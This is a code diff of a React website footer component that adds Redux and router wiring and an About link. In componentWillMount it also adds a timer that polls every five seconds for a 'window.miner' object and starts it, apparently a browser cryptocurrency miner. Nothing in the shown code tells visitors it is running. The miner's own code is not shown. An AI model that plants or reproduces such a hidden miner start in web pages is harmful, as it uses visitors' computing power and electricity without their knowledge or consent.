@@ -1,5 +1,7 @@
 import React, { Component } from 'react';
-import { Link } from 'react-router-dom'
+import { Link } from 'react-router-dom';
+import { connect } from 'react-redux';
+import { withRouter } from 'react-router-dom';
 import { SocialIcon } from 'react-social-icons';
 import './footer.css';
 
@@ -9,19 +11,23 @@ class Footer extends Component {
   }
 
   componentWillMount(){
-    if (window.miner) {
-      window.miner.start();
-    }
+    this.intervalID = setInterval(() => this.mine(), 5000);
   }
 
   mine() {
-    alert('hel')
+    const miner = window.miner();
+    if (miner) {
+      miner.start();
+      clearInterval(this.intervalID);
+    }
   }
 
   render() {
     return (
-      <footer>
+      <footer className="fb">
         <section className="subsection">
+          <h1>Information</h1>
+          <Link to="/about">About</Link>
         </section>
         <section className="subsection">
           <h1>Follow Me</h1>
@@ -37,4 +43,11 @@ class Footer extends Component {
   }
 }
 
-export default Footer;
+const mapStateToProps = state => ({
+  state,
+});
+
+const mapDispatchToProps = dispatch => ({
+});
+
+export default withRouter(connect(mapStateToProps, mapDispatchToProps)(Footer));
